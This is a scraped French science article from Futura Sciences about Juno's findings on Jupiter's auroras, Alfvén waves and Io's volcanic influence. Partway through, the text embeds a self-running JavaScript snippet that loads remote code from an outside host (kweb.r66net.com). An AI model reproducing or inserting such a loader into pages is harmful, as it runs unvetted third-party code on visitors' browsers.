{"title": "Les aurores de Jupiter intriguent de plus en plus les astrophysiciens", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-09-12", "content": "Les aurores polaires de Jupiter sont les plus brillantes du Systeme solaire. Les astrophysiciens pensaient qu'elles etaient causees par le meme mecanisme principal que les aurores terrestres mais les donnees de Juno, la sonde de la Nasa, montrent qu'il n'en est rien. Les processus a l'oeuvre, bien que connus sur Terre, sont encore mal compris. Ce qu'il faut retenir La magnetosphere de la Terre influe sur l'habitabilite de notre planete et sert de modele pour comprendre les exoplanetes. On peut rendre compte des aurores polaires a partir de la theorie de cette magnetosphere. Les observations de la sonde Juno laissent toutefois penser que, sur Jupiter, les aurores polaires sont principalement causees par un mecanisme qui est secondaire dans le cas des aurores terrestres et qui fait intervenir de la turbulence en rapport avec les ondes d'Alfven de la magnetohydrodynamique. Cette decouverte incite a la prudence quant a la transposition au cas des exoplanetes de nos idees tirees des etudes de la magnetosphere de la Terre. Le regrette  Andre Brahic  aimait parler de l'unite (mais aussi de la diversite) du Systeme solaire. Celle-ci avait ete revelee par l'essor de la conquete spatiale et, en particulier, par les  deux sondes de la mission Voyager . Bien que les chercheurs se soient attendus a la decouverte d'un  volcanisme  sur  Io , ils ont ete surpris par l'activite et la diversite des  lunes  de Saturne, et meme par Neptune et son cortege de satellites. A cet egard, Pluton et Charon n'ont pas decu non plus. Andre Brahic aurait probablement aime le contenu de cet article publie dans le journal  Nature  par une equipe internationale de chercheurs et qui concerne les  aurores polaires , non pas sur Saturne mais sur  Jupiter , telles qu'elles sont vues et etudiees a l'aide de la sonde Juno. Cet article aurait probablement aussi interesse le prix Nobel de physique Hannes Alfven, qui s'est beaucoup interesse a la physique des plasmas et aux aurores polaires terrestres.  Une video sur l'exploration du champ magnetique de Jupiter par la mission Juno. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle blanc en bas a droite. Les sous-titres en anglais devraient alors apparaitre. Cliquez ensuite sur l'ecrou a droite du rectangle, puis sur << Sous-titres >> et enfin sur << Traduire automatiquement >>. Choisissez << Francais >>. (c)  NASA Goddard Mais venons-en a Jupiter et a sa  magnetosphere . Celle de la Terre est etroitement liee a l'existence des aurores polaires. Des particules du  vent solaire , essentiellement des protons, des noyaux d'helium mais aussi des  electrons , sont, en quelque sorte, canalisees par les lignes des champs magnetiques ; ces particules se deplacent en spirale autour de ces lignes pour atteindre les poles, ou des champs electriques les accelerent. Elles entrent alors violemment en collision avec les molecules et, surtout, avec les  ions  situes dans l' ionosphere  de la Terre, entre 100 et 500 km d'altitude, qui forment un  plasma . Ce dernier se comporte alors comme l'equivalent d'un tube neon en reponse. C'est ainsi que naissent les aurores polaires. Sur cette image composite, on voit Jupiter, observee dans l'infrarouge par les instruments de New Horizons alors que cette sonde poursuivait son voyage en direction de Pluton. Io est en revanche observee en lumiere presque visible. Notez l'eruption au pole nord de Io, avec son panache bleute. (c) Nasa                               Jupiter, un laboratoire pour etudier les magnetospheres des exoplanetes Les geophysiciens ont decouvert que, dans le cas de notre planete, deux mecanismes d'acceleration se combinent pour accelerer les particules des aurores. L'un est bien compris, et il est responsable des aurores les plus brillantes, alors que l'autre, associe a des emissions variables et moins brillantes, est plus difficile a modeliser car il fait intervenir des processus stochastiques et qui relevent de la physique de la turbulence. Comme les aurores joviennes sont les plus brillantes du Systeme solaire, les astrophysiciens pensaient, la aussi, que ce deuxieme mecanisme d'acceleration etait secondaire. Le saviez-vous ? Hannes Alfven (1908-1995) est un astrophysicien suedois qui a beaucoup contribue a la constitution d'une <<  electrodynamique cosmique  >>. Il a saisi l'importance de cette derniere pour comprendre les phenomenes astrophysiques ; elle est un complement indispensable a la mecanique celeste basee sur les lois de la gravitation. Il a propose le terme << magnetohydrodynamique >> en 1942. Brillant dans ses travaux sur la physique de la magnetosphere des planetes et des etoiles ainsi que sur la cosmogonie du Systeme solaire, il se fourvoiera, helas, plus tard en critiquant la theorie du Big Bang (tout comme Fred Hoyle, il fut incapable d'en comprendre le bien-fonde).  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Mais, selon les mesures des instruments de Juno, il n'en est rien. Des champs electriques bien plus intenses que dans le cas de la Terre (capables de doter les particules de 10 a 30 fois plus d'energie) sont bien observes, mais ces champs ne rendent pas compte des caracteristiques des aurores. Celles-ci s'expliquent plus facilement si c'est le second mecanisme d'acceleration evoque qui est a l'oeuvre, et qui est en relation (bien que dans le cas present de facon un peu mysterieuse encore) avec << les  ondes d'Alfven  >>. Hannes Olof Gosta Alfven en 1942. Il fut laureat du prix Nobel de physique en 1970. (c) DP                       La morale de cette histoire est qu'il vaut mieux etre prudent lorsqu'il s'agit de transposer aux exoplanetes le modele de magnetosphere construit en etudiant la Terre. Certaines conclusions relatives a l'habitabilite ou non de ces  exoplanetes  (qui sont basees en partie sur ce que nous pensons de leur magnetosphere) pourraient souffrir de biais si nous n'y prenons pas garde. Pour en savoir plus Des eruptions sur Io controleraient les aurores joviennes Article de Laurent Sacco publie le 01/02/2013 La magnetosphere de Jupiter est couplee de facon complexe a Io, la plus proche des lunes de la geante. Depuis des decennies, on cherche a demeler l'echeveau de ces relations. Si de nombreuses zones d'ombre subsistent, un nouveau lien entre les aurores de Jupiter et l'activite volcanique sur Io vient d'etre mis en evidence. En 1955, Bernard Burke et Kenneth Franklin, membres du fameux  Carnegie Institute  a Washington, decouvrent que  Jupiter  est une source puissante d'ondes  radio  dans le domaine decametrique. Une decouverte rapidement interpretee comme une preuve de l'existence d'une magnetosphere autour de Jupiter, ou circulent des  electrons . Cette hypothese est ensuite confirmee dans les annees 1970, avec les mesures in situ des sondes  Pioneer  10 et 11, et bien sur par  Voyager 1  et  Voyager 2 . Une video de la Nasa celebrant les decouvertes des missions Voyager 1 et Voyager 2. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle avec deux barres horizontales, en bas a droite. Les sous-titres en anglais devraient alors apparaitre, si ce n'est pas deja le cas. En passant la souris sur le rectangle, vous devriez voir l'expression << Traduire les sous-titres >>. Cliquez pour faire apparaitre le menu du choix de la langue, choisissez << francais >>, puis cliquez sur << OK >>. (c) Nasa SpaceRip Il faudra attendre 1979 pour que  Linda Morabito  decouvre des preuves de l'existence d'un volcanisme sur Io, l'une des lunes de  Jupiter , grace aux observations de Voyager 1. Ce volcanisme, decoulant d'effets de  maree , avait ete predit theoriquement. L'atmosphere et l'ionosphere de Io la volcanique Les missions Pioneer et Voyager ont non seulement permis d'etudier la magnetosphere de Jupiter mais aussi l' atmosphere  et l'ionosphere de Io. On sait ainsi que l'atmosphere de Io est composee a 90 % de dioxyde de  soufre  produit essentiellement par des  eruptions volcaniques . Les 10 % restants sont constitues de divers composes presents a l'etat de traces. Io, la Lune de Jupiter, a ete observee de pres une premiere fois par une sonde Voyager. Ici, c'est une image prise par Galileo. (c) Nasa                               L'ionosphere de Io est constituee d'ions de soufre, d' oxygene  et de  sodium . Elle est situee a 700 km de hauteur et est constamment renouvelee par l'activite volcanique, ce qui maintient son existence. En effet, Io foncant a travers la  magnetosphere de Jupiter , les lois de l' electromagnetisme  imposent que cela genere des  courants electriques , qui entrainent au loin ces ions provenant de Io, a un taux de une tonne par seconde. Un tore de plasma, detecte vers le milieu des annees 1970, se forme ainsi autour de Jupiter. Sans des eruptions frequentes sur Io, ce tore disparaitrait. Une image rapprochee de Io prise par la sonde Galileo en 2000. Elle montre une eruption a Tvashtar Catena, une chaine de cuvettes volcaniques. (c) Nasa                               Des aurores polaires avec des ondes radio hectometriques On sait depuis un certain temps qu'une partie des ions arraches a Io se retrouvent aux poles de Jupiter et que des interactions electrodynamiques complexes entre Io, le tore de plasma et Jupiter y creent des  aurores polaires . Un groupe de chercheurs, compose de Japonais et de Belges, vient de publier dans  Geophysical Research Letters   un article qui apporte de nouveaux elements pour comprendre ces interactions entre Jupiter et Io. Ces images d'aurores sur Jupiter (vues en ultraviolet), superposees a une photo en lumiere visible de l'ensemble de la planete, ont ete prises par Hubble. Ces aurores sont liees aux interactions entre Jupiter et le vent solaire, mais aussi a l'interaction de son champ magnetique avec sa lune Io, entouree d'une ionosphere conductrice d'electricite. (c) Nasa                       On sait qu'en raison de l'activite volcanique de Io, il se forme, en plus du tore de plasma, des jets et des  nuages  de sodium qui alimentent une vaste region appelee la  nebuleuse de sodium  de Jupiter. Le groupe de chercheurs a observe, depuis le sol, cette  nebuleuse  entourant Jupiter et a constate que, de fin mai a debut juin 2007, elle s'etait etoffee. Or, on sait que cela correspond a une augmentation de l'activite volcanique sur Io. Parallelement, les chercheurs ont etudie le rayonnement radio de Jupiter, emis dans la bande des ondes hectometriques. L'intensite de ce rayonnement est une mesure de l'activite aurorale sur Jupiter. Et ils ont constate qu'elle avait diminue juste apres le debut de l'accroissement de la nebuleuse de sodium. Deduction : l'activite volcanique de Io influence de facon non negligeable l'occurrence des  aurores polaires de Jupiter . Kezako : comment se forment les aurores polaires ?                       Les aurores polaires resultent de l'interaction entre les particules ejectees par le Soleil et la magnetosphere terrestre. Elles se manifestent dans le ciel sous forme de lumieres allant du vert au rouge. Cet episode de Kezako, d'Unisciel et de l'universite de Lille 1, nous explique ce superbe phenomene.                                       ", "theme": "sciences"}